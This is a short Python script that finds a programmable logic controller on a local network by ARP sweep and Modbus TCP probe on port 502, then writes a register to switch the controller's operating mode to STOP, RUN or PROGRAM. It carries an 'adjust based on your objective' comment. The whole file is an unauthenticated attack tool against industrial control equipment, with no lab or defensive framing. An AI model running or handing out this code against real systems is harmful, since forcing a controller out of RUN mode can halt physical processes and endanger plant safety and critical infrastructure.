from pyModbusTCP.client import ModbusClient
from scapy.all import ARP, Ether, srp
import time

def find_plc_ip(network_range="192.168.1.0/24"):
    """
    Scan the network to find the PLC's IP address by looking for Modbus-enabled devices.
    """
    print("[*] Scanning network to find the PLC's IP address...")
    
    # Send ARP request to detect active hosts
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network_range)
    answered, _ = srp(arp_request, timeout=2, verbose=False)

    for sent, received in answered:
        ip = received.psrc
        print(f"[+] Potential PLC found at IP: {ip}")
        
        # Check if Modbus TCP is open (port 502)
        modbus_client = ModbusClient(host=ip, port=502, auto_open=True, timeout=3)
        if modbus_client.open():
            print(f"[✓] Confirmed PLC responding on Modbus TCP at {ip}")
            return ip
    
    print("[-] No PLC found on the network.")
    return None

def change_plc_mode(plc_ip, mode_code):
    """
    Connect to the PLC and change its operating mode.

    Mode Codes (Common for Modbus-based PLCs, may vary by manufacturer):
    * 0 = STOP
    * 1 = RUN
    * 2 = PROGRAM
    * 3 = REMOTE
    """
    print(f"[*] Attempting to change PLC mode at {plc_ip} to {mode_code}...")

    # Connect to the PLC via Modbus TCP
    plc = ModbusClient(host=plc_ip, port=502, auto_open=True, timeout=5)
    if not plc.open():
        print("[-] Failed to connect to PLC")
        return False

    # Change operating mode (Mode register address depends on the PLC model)
    MODE_REGISTER_ADDRESS = 0x0000  # Placeholder: Adjust based on PLC documentation

    success = plc.write_single_register(MODE_REGISTER_ADDRESS, mode_code)
    
    if success:
        print(f"[+] Successfully changed PLC mode to {mode_code}")
    else:
        print("[-] Failed to change PLC mode")
    
    plc.close()
    return success

if __name__ == "__main__":
    # Step 1: Find the PLC on the network
    plc_ip = find_plc_ip()

    if plc_ip:
        # Step 2: Change the PLC mode (2 corresponds to 'PROGRAM' Mode as an example)
        TARGET_MODE = 2  # Change this based on your objective

        time.sleep(2)  # Small delay before mode change
        change_plc_mode(plc_ip, TARGET_MODE)
    else:
        print("[-] Unable to proceed without PLC IP.")